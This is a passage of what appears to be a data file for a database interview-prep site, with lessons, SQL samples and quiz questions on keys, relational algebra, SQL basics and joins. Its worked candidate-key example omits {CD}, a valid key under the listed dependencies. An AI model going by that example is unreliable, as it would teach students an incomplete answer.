{student_id, name} are superkeys (they uniquely identify rows). But only {student_id} is a candidate key because it is minimal &mdash; removing any attribute would lose uniqueness. {student_id, name} is a superkey but not a candidate key because the subset {student_id} is already sufficient.</p><p class="learn-p"><b>Q6: When would you use ON DELETE SET NULL vs. ON DELETE CASCADE?</b><br>A: Use CASCADE when the child rows have no meaning without the parent (e.g., order line items when the order is deleted). Use SET NULL when the child rows should survive but lose the association (e.g., employees whose department is dissolved &mdash; they still exist but become unassigned). The choice depends on business semantics.</p></div>',
          code: `-- =============================================
-- Keys & Constraints: Demonstrations
-- =============================================

-- 1. All types of keys in one schema
CREATE TABLE Student (
    student_id   INT PRIMARY KEY,           -- Primary Key
    roll_number  VARCHAR(20) UNIQUE NOT NULL,-- Alternate Key (Candidate Key)
    first_name   VARCHAR(50) NOT NULL,
    last_name    VARCHAR(50),
    email        VARCHAR(100) UNIQUE,        -- Alternate Key
    dob          DATE,
    dept_id      INT,                        -- Foreign Key
    FOREIGN KEY (dept_id) REFERENCES Department(dept_id)
        ON DELETE SET NULL
        ON UPDATE CASCADE
);

-- 2. Composite Primary Key example
CREATE TABLE Enrollment (
    student_id  INT,
    course_id   INT,
    semester    VARCHAR(10),
    grade       CHAR(2),
    PRIMARY KEY (student_id, course_id, semester),  -- Composite Key
    FOREIGN KEY (student_id) REFERENCES Student(student_id),
    FOREIGN KEY (course_id) REFERENCES Course(course_id)
);

-- 3. Surrogate Key with AUTO_INCREMENT
CREATE TABLE Order_Log (
    log_id       INT AUTO_INCREMENT PRIMARY KEY,  -- Surrogate Key
    order_id     INT NOT NULL,
    action       VARCHAR(50),
    action_time  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- 4. Various constraints demonstrated
CREATE TABLE Employee (
    emp_id     INT PRIMARY KEY,
    name       VARCHAR(100) NOT NULL,          -- NOT NULL
    age        INT CHECK (age >= 18 AND age <= 65),  -- CHECK
    salary     DECIMAL(10,2) DEFAULT 30000.00, -- DEFAULT
    dept_id    INT NOT NULL,
    email      VARCHAR(200) UNIQUE,            -- UNIQUE
    FOREIGN KEY (dept_id) REFERENCES Department(dept_id)
        ON DELETE RESTRICT
        ON UPDATE CASCADE
);

-- 5. Finding candidate keys: worked example
-- Relation R(A, B, C, D, E)
-- FDs: A -> BC, CD -> E, B -> D, E -> A
-- Step 1: Attributes only on LHS or neither: none exclusively
-- Step 2: Try {A}: A+ = {A,B,C,D,E} = R => {A} is candidate key
-- Step 3: Try {E}: E+ = {E,A,B,C,D} = R => {E} is candidate key
-- Step 4: Try {B}: B+ = {B,D} ≠ R
-- Step 5: Try {C}: C+ = {C} ≠ R
-- Step 6: Try {BC}: BC+ = {B,C,D,E,A} = R => {BC} is candidate key
-- Candidate keys: {A}, {E}, {BC}

-- 6. Referential integrity actions demo
CREATE TABLE Department (
    dept_id   INT PRIMARY KEY,
    name      VARCHAR(100) NOT NULL
);

CREATE TABLE Staff (
    staff_id  INT PRIMARY KEY,
    name      VARCHAR(100),
    dept_id   INT,
    FOREIGN KEY (dept_id) REFERENCES Department(dept_id)
        ON DELETE CASCADE       -- Delete staff if dept deleted
        ON UPDATE CASCADE       -- Update FK if dept PK changes
);`,
          problems: [
            ['Functional Dependencies', 'https://www.geeksforgeeks.org/types-of-functional-dependencies-in-dbms/', 'Easy'],
            ['Armstrong Axioms Practice', 'https://www.geeksforgeeks.org/armstrongs-axioms-in-functional-dependency-in-dbms/', 'Medium'],
            ['Integrity Constraints in DBMS', 'https://www.geeksforgeeks.org/constraints-on-relational-database-model/', 'Easy']
          ],
          mcqs: [
            {q: 'If a relation has N candidate keys, how many primary keys does it have?', o: ['N', '1', 'N-1', 'Depends on the DBMS'], a: 1},
            {q: 'Which of the following is NOT an Armstrong\'s axiom?', o: ['Reflexivity', 'Augmentation', 'Transitivity', 'Complementation'], a: 3},
            {q: 'A foreign key in table T1 references the primary key of table T2. If a row in T2 is deleted and the FK action is SET NULL, what happens?', o: ['The corresponding rows in T1 are deleted', 'The FK column in T1 is set to NULL', 'The delete operation is rejected', 'The FK column is set to the default value'], a: 1},
            {q: 'Given R(A, B, C, D) with FDs: A&rarr;B, B&rarr;C, C&rarr;D. What is the candidate key?', o: ['{A, B}', '{A}', '{A, B, C}', '{B, C}'], a: 1},
            {q: 'Which constraint ensures that the primary key column cannot contain NULL values?', o: ['Referential integrity constraint', 'Domain constraint', 'Entity integrity constraint', 'Key constraint'], a: 2},
            {q: 'A UNIQUE constraint differs from a PRIMARY KEY constraint in that:', o: ['UNIQUE does not allow duplicates but allows NULLs', 'UNIQUE allows duplicates but not NULLs', 'UNIQUE is the same as PRIMARY KEY', 'UNIQUE cannot be used on composite columns'], a: 0},
            {q: 'Which derived rule of Armstrong\'s axioms states: if X&rarr;Y and X&rarr;Z then X&rarr;YZ?', o: ['Decomposition', 'Pseudo-transitivity', 'Union', 'Augmentation'], a: 2},
            {q: 'In a relation with attributes {A, B, C, D, E} and FDs {AB&rarr;C, C&rarr;D, D&rarr;E}, how many attributes does the closure of {A, B} contain?', o: ['2', '3', '4', '5'], a: 3}
          ]
        },
        {
          t: 'Relational Algebra',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">When a database engine receives your SQL query, it does not execute it as written. Instead, it translates the query into a <b>relational algebra expression tree</b>, optimizes it by rearranging operations (pushing selections down, reordering joins), and then executes the optimized plan. Understanding relational algebra gives you insight into <b>why</b> certain queries are slow and <b>how</b> the optimizer thinks. In interviews, relational algebra questions test your grasp of the theoretical underpinnings of SQL &mdash; can you express a complex query using formal set operations, and do you understand the equivalences the optimizer exploits?</p></div><div class="learn-section"><div class="learn-h">What is Relational Algebra?</div><p class="learn-p"><b>Relational Algebra</b> is a procedural query language that forms the theoretical foundation of SQL. It specifies <b>how</b> to retrieve data using a set of operations on relations (tables). Every SQL query can be expressed as a relational algebra expression.</p></div><div class="learn-section"><div class="learn-h">Unary Operations</div><table class="learn-table"><tr><th>Operation</th><th>Symbol</th><th>SQL Equivalent</th><th>Description</th></tr><tr><td>Selection</td><td>σ (sigma)</td><td>WHERE</td><td>Filter rows by condition</td></tr><tr><td>Projection</td><td>π (pi)</td><td>SELECT columns</td><td>Choose specific columns (removes duplicates)</td></tr><tr><td>Rename</td><td>ρ (rho)</td><td>AS</td><td>Rename relation or attributes</td></tr></table><div class="learn-code">σ_{salary > 50000}(Employee)     →  SELECT * FROM Employee WHERE salary > 50000\nπ_{name, salary}(Employee)        →  SELECT DISTINCT name, salary FROM Employee\nρ_{S}(Employee)                   →  Employee AS S</div></div><div class="learn-section"><div class="learn-h">Binary Set Operations</div><table class="learn-table"><tr><th>Operation</th><th>Symbol</th><th>Requirement</th><th>SQL</th></tr><tr><td>Union</td><td>∪</td><td>Union-compatible (same schema)</td><td>UNION</td></tr><tr><td>Set Difference</td><td>−</td><td>Union-compatible</td><td>EXCEPT</td></tr><tr><td>Intersection</td><td>∩</td><td>Union-compatible</td><td>INTERSECT</td></tr><tr><td>Cartesian Product</td><td>×</td><td>No requirement</td><td>CROSS JOIN</td></tr></table></div><div class="learn-section"><div class="learn-h">Join Operations</div><table class="learn-table"><tr><th>Join</th><th>Notation</th><th>Description</th></tr><tr><td>Natural Join</td><td>R ⋈ S</td><td>Join on all common attributes, remove duplicates</td></tr><tr><td>Theta Join</td><td>R ⋈_{θ} S</td><td>Join on arbitrary condition θ</td></tr><tr><td>Equi-Join</td><td>R ⋈_{R.a=S.b} S</td><td>Theta join where θ uses only equality</td></tr><tr><td>Left Outer Join</td><td>R ⟕ S</td><td>Keep all rows from R, NULL-fill unmatched S</td></tr><tr><td>Semijoin</td><td>R ⋉ S</td><td>Tuples in R that have a match in S</td></tr><tr><td>Anti-join</td><td>R ▷ S</td><td>Tuples in R with NO match in S</td></tr></table></div><div class="learn-section"><div class="learn-h">Division Operation</div><p class="learn-p"><b>Division</b> (R ÷ S) answers "find all X that are associated with every Y in S." Classic example: "Find students enrolled in ALL courses."</p><div class="learn-code">-- R(student, course) ÷ S(course) = students enrolled in ALL courses in S\n\n-- SQL equivalent:\nSELECT student FROM R\nGROUP BY student\nHAVING COUNT(DISTINCT course) = (SELECT COUNT(*) FROM S);</div><div class="learn-tip"><b>Interview tip:</b> Division is rarely asked directly, but the SQL pattern (GROUP BY + HAVING COUNT = total) is very common. Know both the RA notation and the SQL translation.</div></div><div class="learn-section"><div class="learn-h">Expression Trees &amp; Precedence</div><p class="learn-p">Relational algebra expressions can be drawn as <b>expression trees</b> (also called query trees). Leaves are base relations; internal nodes are RA operations. The query optimizer converts SQL to these trees and rearranges operations for efficiency (e.g., pushing selections down).</p><div class="learn-code">-- Query: Names of employees in IT dept with salary > 80000\n\n-- RA expression:\nπ_{name}(σ_{dept=\'IT\' AND salary>80000}(Employee))\n\n-- Optimized (push selection down):\nπ_{name}(σ_{salary>80000}(σ_{dept=\'IT\'}(Employee)))\n\n-- Even better with join:\nπ_{name}(σ_{salary>80000}(Employee ⋈ σ_{dname=\'IT\'}(Department)))</div></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>Projection removes duplicates</b> &mdash; Unlike SQL\'s SELECT (which keeps duplicates by default), the relational algebra projection (π) always produces a set with no duplicates. To match SQL behavior, you need the multiset (bag) version of RA.</li><li><b>Union compatibility</b> &mdash; Union (∪), Intersection (∩), and Set Difference (−) all require the two input relations to have the <b>same number of attributes</b> with <b>compatible domains</b>. Forgetting this is a common exam mistake.</li><li><b>Natural join pitfall</b> &mdash; Natural join matches on ALL common attribute names. If two tables happen to share a column name that shouldn\'t be a join condition (e.g., both have a "name" column), the natural join produces incorrect results. Prefer explicit equi-join in practice.</li><li><b>Division is not a primitive</b> &mdash; The division operator (÷) can be expressed using other primitive operations: R ÷ S = π_X(R) − π_X((π_X(R) × S) − R), where X is the set of attributes in R but not in S. Interviewers may ask you to derive this.</li><li><b>Selection commutativity</b> &mdash; σ_{c1}(σ_{c2}(R)) = σ_{c2}(σ_{c1}(R)) = σ_{c1 AND c2}(R). This equivalence is crucial for query optimization &mdash; the optimizer pushes the most selective condition down first.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Operation</th><th>Typical Cost</th><th>Notes</th></tr><tr><td>Selection (σ)</td><td>O(n) without index, O(log n) with B-tree</td><td>Push down as early as possible</td></tr><tr><td>Projection (π)</td><td>O(n) + O(n log n) for duplicate removal</td><td>Duplicate removal via sorting or hashing</td></tr><tr><td>Cartesian Product (×)</td><td>O(n &times; m)</td><td>Extremely expensive; avoid in practice</td></tr><tr><td>Nested-Loop Join</td><td>O(n &times; m)</td><td>Simple but slow for large tables</td></tr><tr><td>Sort-Merge Join</td><td>O(n log n + m log m)</td><td>Efficient when both inputs are large</td></tr><tr><td>Hash Join</td><td>O(n + m)</td><td>Best for equi-joins with sufficient memory</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What is the difference between selection and projection?</b><br>A: Selection (σ) filters <b>rows</b> based on a condition (horizontal slicing), analogous to SQL\'s WHERE clause. Projection (π) selects <b>columns</b> and removes duplicates (vertical slicing), analogous to SELECT DISTINCT. They operate on different dimensions of the relation.</p><p class="learn-p"><b>Q2: Express "find employees who work in every department" using relational algebra.</b><br>A: This is a division problem. Let Works_In(emp_id, dept_id) and Departments(dept_id). The answer is Works_In ÷ π_{dept_id}(Departments). In SQL: SELECT emp_id FROM Works_In GROUP BY emp_id HAVING COUNT(DISTINCT dept_id) = (SELECT COUNT(*) FROM Departments).</p><p class="learn-p"><b>Q3: Why does the query optimizer push selections down the expression tree?</b><br>A: Pushing selections down reduces the number of tuples processed by subsequent operations (especially joins and Cartesian products). Since selection is cheap (linear scan) and reduces cardinality, applying it early dramatically cuts the cost of the overall query plan.</p><p class="learn-p"><b>Q4: What is a semijoin and when is it useful?</b><br>A: A semijoin R ⋉ S returns tuples from R that have at least one matching tuple in S, without appending any attributes from S. It is useful in distributed databases to reduce data transfer: send the join column of S to the remote site, filter R, then transfer only matching tuples back.</p><p class="learn-p"><b>Q5: Can you express natural join using primitive RA operations?</b><br>A: Yes. R ⋈ S = π_{unique attrs}(σ_{R.common = S.common}(R × S)). That is: take the Cartesian product, select rows where common attributes match, and project out the duplicate columns. This is why natural join is a derived operation, not primitive.</p><p class="learn-p"><b>Q6: What is the difference between Cartesian product and cross join?</b><br>A: They are identical. In relational algebra it is called the Cartesian product (×); in SQL it is called CROSS JOIN. Both produce every possible combination of rows from two relations, resulting in |R| &times; |S| tuples.</p></div>',
          code: `-- Relational Algebra → SQL Translations

-- Selection (σ): Filter rows
-- σ_{age > 25}(Students)
SELECT * FROM Students WHERE age > 25;

-- Projection (π): Select columns
-- π_{name, gpa}(Students)
SELECT DISTINCT name, gpa FROM Students;

-- Union (∪): Combine two compatible relations
-- CSStudents ∪ MathStudents
SELECT name FROM CSStudents
UNION
SELECT name FROM MathStudents;

-- Set Difference (−): Rows in R but not in S
-- CSStudents − MathStudents
SELECT name FROM CSStudents
EXCEPT
SELECT name FROM MathStudents;

-- Cartesian Product (×):
-- Students × Courses
SELECT * FROM Students CROSS JOIN Courses;

-- Natural Join (⋈):
-- Students ⋈ Enrollment (join on common column student_id)
SELECT * FROM Students NATURAL JOIN Enrollment;

-- Theta Join:
-- Students ⋈_{Students.advisor_id = Faculty.fac_id} Faculty
SELECT * FROM Students s
JOIN Faculty f ON s.advisor_id = f.fac_id;

-- Division (÷):
-- "Students enrolled in ALL courses"
-- Enrollment(student_id, course_id) ÷ Courses(course_id)
SELECT student_id FROM Enrollment
GROUP BY student_id
HAVING COUNT(DISTINCT course_id) = (SELECT COUNT(*) FROM Courses);

-- Semi-Join (⋉):
-- Students who have at least one enrollment
SELECT * FROM Students s
WHERE EXISTS (SELECT 1 FROM Enrollment e WHERE e.student_id = s.student_id);

-- Anti-Join (▷):
-- Students with NO enrollment
SELECT * FROM Students s
WHERE NOT EXISTS (SELECT 1 FROM Enrollment e WHERE e.student_id = s.student_id);`,
          problems: [
            ['Relational Algebra Basics', 'https://www.geeksforgeeks.org/introduction-of-relational-algebra-in-dbms/', 'Easy'],
            ['RA to SQL Conversion', 'https://www.geeksforgeeks.org/difference-between-relational-algebra-and-relational-calculus/', 'Medium'],
            ['Query Optimization Basics', 'https://www.geeksforgeeks.org/query-optimization-in-relational-algebra/', 'Medium']
          ],
          mcqs: [
            {q: 'Which RA operation corresponds to the SQL WHERE clause?', o: ['Projection (π)', 'Selection (σ)', 'Rename (ρ)', 'Join (⋈)'], a: 1},
            {q: 'The Division operation R ÷ S finds:', o: ['Rows in R but not S', 'All X in R associated with every Y in S', 'The Cartesian product of R and S', 'Common rows between R and S'], a: 1},
            {q: 'Natural Join automatically joins on:', o: ['The first column of each table', 'All columns with the same name', 'The primary keys only', 'A user-specified condition'], a: 1},
            {q: 'Which RA operation is NOT a primitive operation?', o: ['Selection (σ)', 'Cartesian Product (×)', 'Natural Join (⋈)', 'Set Difference (−)'], a: 2},
            {q: 'The anti-join R ▷ S returns:', o: ['All tuples in R that have a match in S', 'All tuples in R that have NO match in S', 'The Cartesian product minus the join', 'Common tuples between R and S'], a: 1},
            {q: 'For union (R ∪ S) to be valid, which condition must hold?', o: ['R and S must have the same primary key', 'R and S must be union-compatible (same schema)', 'R and S must have at least one common attribute', 'R must be a subset of S'], a: 1},
            {q: 'Pushing selection down in a query tree is beneficial because:', o: ['It increases the number of tuples for joins', 'It reduces the cardinality of intermediate results', 'It eliminates the need for projection', 'It converts set operations to join operations'], a: 1},
            {q: 'The RA expression π_{A}(σ_{B>5}(R)) is equivalent to which SQL query?', o: ['SELECT A FROM R WHERE B > 5', 'SELECT DISTINCT A FROM R WHERE B > 5', 'SELECT * FROM R WHERE A > 5', 'SELECT B FROM R WHERE A > 5'], a: 1}
          ]
        }
      ]
    },
    {
      id: 'sql', t: 'SQL',
      topics: [
        {
          t: 'SQL Basics (DDL, DML, SELECT, WHERE, GROUP BY)',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Every backend system in finance relies on SQL to manage financial data, trade records, and analytics. Whether you\'re querying a portfolio database, building a reporting pipeline, or debugging a slow dashboard query, SQL fluency is non-negotiable. Interviewers test not just syntax but your understanding of execution order, edge cases with NULLs, and performance implications of different constructs. A typical interview scenario: "Given a table of daily trades, write a query to find the top 3 traders by total volume per month, excluding months where they traded fewer than 5 times." Solving this cleanly requires mastery of SELECT, GROUP BY, HAVING, and ORDER BY working together.</p></div><div class="learn-section"><div class="learn-h">Introduction to SQL</div><p class="learn-p"><b>SQL (Structured Query Language)</b> is the standard language for interacting with relational databases. It is declarative — you specify <i>what</i> you want, not <i>how</i> to get it. SQL is divided into several sub-languages:</p><table class="learn-table"><tr><th>Category</th><th>Commands</th><th>Purpose</th></tr><tr><td>DDL (Data Definition Language)</td><td>CREATE, ALTER, DROP, TRUNCATE</td><td>Define/modify schema</td></tr><tr><td>DML (Data Manipulation Language)</td><td>INSERT, UPDATE, DELETE, SELECT</td><td>Manipulate data</td></tr><tr><td>DCL (Data Control Language)</td><td>GRANT, REVOKE</td><td>Access control</td></tr><tr><td>TCL (Transaction Control Language)</td><td>COMMIT, ROLLBACK, SAVEPOINT</td><td>Transaction management</td></tr></table></div><div class="learn-section"><div class="learn-h">DDL Commands</div><p class="learn-p"><b>CREATE TABLE</b> defines a new table:</p><div class="learn-code">CREATE TABLE Employees (\n    emp_id    INT PRIMARY KEY AUTO_INCREMENT,\n    name      VARCHAR(100) NOT NULL,\n    dept      VARCHAR(50) DEFAULT \'Engineering\',\n    salary    DECIMAL(10,2) CHECK (salary &gt; 0),\n    hire_date DATE\n);</div><p class="learn-p"><b>ALTER TABLE</b> modifies an existing table:</p><div class="learn-code">-- Add a column\nALTER TABLE Employees ADD email VARCHAR(100) UNIQUE;\n-- Modify column data type\nALTER TABLE Employees MODIFY salary DECIMAL(12,2);\n-- Drop a column\nALTER TABLE Employees DROP COLUMN email;\n-- Rename table\nALTER TABLE Employees RENAME TO Staff;</div><p class="learn-p"><b>DROP vs TRUNCATE</b>:</p><ul class="learn-list"><li><code>DROP TABLE</code> — Removes the table and its schema entirely.</li><li><code>TRUNCATE TABLE</code> — Removes all rows but keeps the schema. Faster than DELETE (no row-by-row logging). Cannot be rolled back in most RDBMS. Resets AUTO_INCREMENT.</li></ul><div class="learn-warn"><b>Warning:</b> <code>TRUNCATE</code> is a DDL command despite affecting data. It cannot have a WHERE clause and cannot fire row-level triggers. Interviewers often ask the difference between DELETE and TRUNCATE.</div></div><div class="learn-section"><div class="learn-h">DML Commands</div><p class="learn-p"><b>INSERT</b> adds new rows:</p><div class="learn-code">-- Single row\nINSERT INTO Employees (name, dept, salary, hire_date)\nVALUES (\'Alice\', \'Engineering\', 95000, \'2024-01-15\');\n\n-- Multiple rows\nINSERT INTO Employees (name, dept, salary, hire_date) VALUES\n(\'Bob\', \'Sales\', 72000, \'2024-02-01\'),\n(\'Carol\', \'Engineering\', 105000, \'2023-11-20\');</div><p class="learn-p"><b>UPDATE</b> modifies existing rows:</p><div class="learn-code">UPDATE Employees SET salary = salary * 1.10\nWHERE dept = \'Engineering\' AND hire_date &lt; \'2024-01-01\';</div><p class="learn-p"><b>DELETE</b> removes rows:</p><div class="learn-code">DELETE FROM Employees WHERE dept = \'Sales\' AND salary &lt; 50000;</div></div><div class="learn-section"><div class="learn-h">SELECT, WHERE, and Operators</div><p class="learn-p">The <b>SELECT</b> statement retrieves data. The logical order of execution is:</p><ol class="learn-list"><li><b>FROM</b> — Identify the table(s)</li><li><b>WHERE</b> — Filter rows</li><li><b>GROUP BY</b> — Group rows</li><li><b>HAVING</b> — Filter groups</li><li><b>SELECT</b> — Choose columns, compute expressions</li><li><b>ORDER BY</b> — Sort the result</li><li><b>LIMIT</b> — Restrict number of rows</li></ol><div class="learn-tip"><b>Tip:</b> Knowing the logical execution order is critical. For example, you cannot use a column alias defined in SELECT inside the WHERE clause because WHERE executes before SELECT.</div><p class="learn-p">Key operators in WHERE:</p><ul class="learn-list"><li><code>= , &lt;&gt; , &lt; , &gt; , &lt;= , &gt;=</code> — Comparison operators</li><li><code>AND, OR, NOT</code> — Logical operators</li><li><code>BETWEEN a AND b</code> — Range check (inclusive)</li><li><code>IN (v1, v2, ...)</code> — Membership test</li><li><code>LIKE \'pattern\'</code> — Pattern matching (<code>%</code> = any chars, <code>_</code> = one char)</li><li><code>IS NULL / IS NOT NULL</code> — NULL checks (never use = NULL)</li></ul></div><div class="learn-section"><div class="learn-h">GROUP BY and Aggregate Functions</div><p class="learn-p"><b>GROUP BY</b> groups rows sharing the same value(s) in specified columns. Aggregate functions then operate on each group:</p><table class="learn-table"><tr><th>Function</th><th>Description</th></tr><tr><td>COUNT(*)</td><td>Number of rows in group</td></tr><tr><td>COUNT(col)</td><td>Number of non-NULL values</td></tr><tr><td>SUM(col)</td><td>Sum of values</td></tr><tr><td>AVG(col)</td><td>Average of values</td></tr><tr><td>MIN(col) / MAX(col)</td><td>Minimum / Maximum value</td></tr></table><div class="learn-code">-- Average salary per department, only departments with avg &gt; 80000\nSELECT dept, COUNT(*) AS num_employees, AVG(salary) AS avg_sal\nFROM Employees\nWHERE hire_date &gt;= \'2023-01-01\'\nGROUP BY dept\nHAVING AVG(salary) &gt; 80000\nORDER BY avg_sal DESC;</div><div class="learn-warn"><b>Warning:</b> In standard SQL, every column in SELECT that is not an aggregate must appear in GROUP BY. MySQL allows non-grouped columns (picks an arbitrary value) but this is non-standard and error-prone.</div></div><div class="learn-section"><div class="learn-h">DISTINCT, ORDER BY, LIMIT</div><p class="learn-p"><code>DISTINCT</code> removes duplicate rows from the result. <code>ORDER BY</code> sorts the result (ASC by default, DESC for descending). <code>LIMIT</code> restricts the number of rows returned.</p><div class="learn-code">-- Top 5 highest-paid distinct salaries\nSELECT DISTINCT salary\nFROM Employees\nORDER BY salary DESC\nLIMIT 5;</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What is the logical execution order of a SQL query?</b><br>A: FROM &rarr; WHERE &rarr; GROUP BY &rarr; HAVING &rarr; SELECT &rarr; ORDER BY &rarr; LIMIT. This is why you cannot use a SELECT alias in WHERE (WHERE executes before SELECT). However, MySQL allows aliases in GROUP BY and HAVING as a non-standard extension.</p><p class="learn-p"><b>Q2: What is the difference between DELETE, TRUNCATE, and DROP?</b><br>A: DELETE is DML (row-by-row, can use WHERE, can rollback, fires triggers). TRUNCATE is DDL (removes all rows, resets auto-increment, generally cannot rollback, does not fire row-level triggers). DROP removes the table structure and data entirely.</p><p class="learn-p"><b>Q3: What is the difference between WHERE and HAVING?</b><br>A: WHERE filters individual rows before grouping. HAVING filters groups after GROUP BY. HAVING can use aggregate functions (e.g., HAVING COUNT(*) &gt; 5); WHERE cannot. If you can filter with WHERE, prefer it &mdash; it reduces the data before grouping, improving performance.</p><p class="learn-p"><b>Q4: What does COUNT(*) vs COUNT(column) vs COUNT(DISTINCT column) return?</b><br>A: COUNT(*) counts all rows including NULLs. COUNT(column) counts non-NULL values in that column. COUNT(DISTINCT column) counts unique non-NULL values. For example, if a column has values [1, 2, NULL, 2], COUNT(*) = 4, COUNT(col) = 3, COUNT(DISTINCT col) = 2.</p><p class="learn-p"><b>Q5: Why should you never use = NULL instead of IS NULL?</b><br>A: In SQL, NULL represents an unknown value. Any comparison with NULL using = yields NULL (not TRUE or FALSE), because you cannot know if an unknown equals something. IS NULL is a special operator designed for this check. Similarly, NULL = NULL is NULL, not TRUE.</p><p class="learn-p"><b>Q6: Can you use a column alias in WHERE? In ORDER BY?</b><br>A: No for WHERE (it executes before SELECT where aliases are defined). Yes for ORDER BY (it executes after SELECT). GROUP BY behavior varies: MySQL allows aliases, standard SQL does not.</p><p class="learn-p"><b>Q7: What happens if you SELECT a non-aggregated column without including it in GROUP BY?</b><br>A: In standard SQL, this is an error. MySQL with ONLY_FULL_GROUP_BY disabled allows it but returns an arbitrary value from the group, which is unpredictable and error-prone. Always include all non-aggregated columns in GROUP BY.</p></div>',
          code: `-- =============================================
-- SQL Basics: DDL, DML, SELECT, WHERE, GROUP BY
-- =============================================

-- DDL: Create the schema
CREATE TABLE Departments (
    dept_id   INT PRIMARY KEY AUTO_INCREMENT,
    name      VARCHAR(100) NOT NULL UNIQUE,
    location  VARCHAR(200)
);

CREATE TABLE Employees (
    emp_id    INT PRIMARY KEY AUTO_INCREMENT,
    name      VARCHAR(100) NOT NULL,
    dept_id   INT,
    salary    DECIMAL(10,2) CHECK (salary > 0),
    hire_date DATE NOT NULL,
    email     VARCHAR(200) UNIQUE,
    FOREIGN KEY (dept_id) REFERENCES Departments(dept_id)
);

-- DML: Insert sample data
INSERT INTO Departments (name, location) VALUES
('Engineering', 'Building A'),
('Sales', 'Building B'),
('HR', 'Building C');

INSERT INTO Employees (name, dept_id, salary, hire_date, email) VALUES
('Alice',  1, 95000,  '2023-06-15', 'alice@company.com'),
('Bob',    2, 72000,  '2024-02-01', 'bob@company.com'),
('Carol',  1, 105000, '2022-11-20', 'carol@company.com'),
('Dave',   3, 68000,  '2024-03-10', 'dave@company.com'),
('Eve',    1, 110000, '2021-08-05', 'eve@company.com'),
('Frank',  2, 75000,  '2023-09-12', 'frank@company.com');

-- SELECT basics
SELECT * FROM Employees;
SELECT name, salary FROM Employees WHERE dept_id = 1;
SELECT name, salary FROM Employees
WHERE salary BETWEEN 70000 AND 100000;

-- Pattern matching
SELECT * FROM Employees WHERE name LIKE 'A%';
SELECT * FROM Employees WHERE email LIKE '%@company.com';

-- NULL handling
SELECT * FROM Employees WHERE dept_id IS NOT NULL;

-- GROUP BY with aggregates
SELECT d.name AS department,
       COUNT(e.emp_id) AS headcount,
       ROUND(AVG(e.salary), 2) AS avg_salary,
       MAX(e.salary) AS max_salary,
       MIN(e.salary) AS min_salary
FROM Employees e
JOIN Departments d ON e.dept_id = d.dept_id
GROUP BY d.name
HAVING COUNT(e.emp_id) >= 2
ORDER BY avg_salary DESC;

-- DISTINCT
SELECT DISTINCT dept_id FROM Employees;

-- Top N pattern
SELECT name, salary FROM Employees
ORDER BY salary DESC LIMIT 3;

-- UPDATE with conditions
UPDATE Employees SET salary = salary * 1.10
WHERE dept_id = 1 AND hire_date < '2023-01-01';

-- DELETE
DELETE FROM Employees WHERE emp_id = 4;

-- ALTER TABLE
ALTER TABLE Employees ADD bonus DECIMAL(10,2) DEFAULT 0;

-- TRUNCATE vs DELETE
-- TRUNCATE TABLE Employees;  -- DDL, removes all rows, resets auto_increment
-- DELETE FROM Employees;     -- DML, row-by-row, can use WHERE, can rollback`,
          problems: [
            ['Select All - HackerRank', 'https://www.hackerrank.com/challenges/select-all-sql/problem', 'Easy'],
            ['Employee Salaries', 'https://www.hackerrank.com/challenges/salary-of-employees/problem', 'Easy'],
            ['Nth Highest Salary - LeetCode', 'https://leetcode.com/problems/nth-highest-salary/', 'Medium'],
            ['Department Highest Salary', 'https://leetcode.com/problems/department-highest-salary/', 'Hard'],
            ['Second Highest Salary', 'https://leetcode.com/problems/second-highest-salary/', 'Medium'],
            ['Duplicate Emails', 'https://leetcode.com/problems/duplicate-emails/', 'Easy']
          ],
          mcqs: [
            {q: 'Which of the following is the correct logical order of SQL query execution?', o: ['SELECT → FROM → WHERE → GROUP BY', 'FROM → WHERE → GROUP BY → HAVING → SELECT → ORDER BY', 'FROM → SELECT → WHERE → GROUP BY', 'SELECT → FROM → GROUP BY → WHERE'], a: 1},
            {q: 'What is the difference between TRUNCATE and DELETE?', o: ['TRUNCATE is DML, DELETE is DDL', 'TRUNCATE can have WHERE, DELETE cannot', 'TRUNCATE is DDL and faster; DELETE is DML and can be rolled back', 'There is no difference'], a: 2},
            {q: 'SELECT dept, MAX(salary) FROM Employees; — without GROUP BY, this query:', o: ['Returns the maximum salary for each department', 'Returns an error in standard SQL', 'Returns the first department and the maximum salary', 'Returns all departments with the same max salary'], a: 1},
            {q: 'What does WHERE name LIKE \'_a%\' match?', o: ['Names starting with "a"', 'Names where the second character is "a"', 'Names containing "a" anywhere', 'Names ending with "a"'], a: 1},
            {q: 'Which of the following is TRUE about NULL in SQL?', o: ['NULL = NULL evaluates to TRUE', 'NULL + 5 evaluates to 5', 'COUNT(*) counts NULLs but COUNT(col) does not', 'NULL values are treated as 0 in SUM()'], a: 2},
            {q: 'What is the difference between HAVING and WHERE?', o: ['HAVING is faster than WHERE', 'WHERE filters groups, HAVING filters rows', 'HAVING filters groups after GROUP BY, WHERE filters rows before grouping', 'They are interchangeable in all cases'], a: 2},
            {q: 'Which SQL sub-language does the GRANT command belong to?', o: ['DDL', 'DML', 'DCL', 'TCL'], a: 2},
            {q: 'SELECT DISTINCT dept FROM Employees ORDER BY salary; — this query:', o: ['Returns distinct departments sorted by salary', 'Returns an error because salary is not in SELECT', 'Returns distinct departments in random order', 'Returns all departments with salaries'], a: 1}
          ]
        },
        {
          t: 'Joins',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Real-world databases are normalized into multiple tables, and joins are how you reassemble that data. In a trading system, you might join a Trades table with Instruments, Portfolios, and Counterparties to build a risk report. A poorly chosen join can silently drop rows (INNER when you needed LEFT) or explode the result set (accidental CROSS JOIN on large tables). Interviewers frequently test join mechanics: "What happens when the join key has NULLs?", "How do you find rows in A that have no match in B?", and "What is the output row count of this multi-table join?" Mastering joins is foundational to every SQL interview round.</p></div><div class="learn-section"><div class="learn-h">Introduction to Joins</div><p class="learn-p"><b>Joins</b> combine rows from two or more tables based on a related column between them. They are the backbone of relational queries. Understanding when to use which join type is essential for interviews.</p><p class="learn-p">Consider two tables:</p><div class="learn-code">Employees:           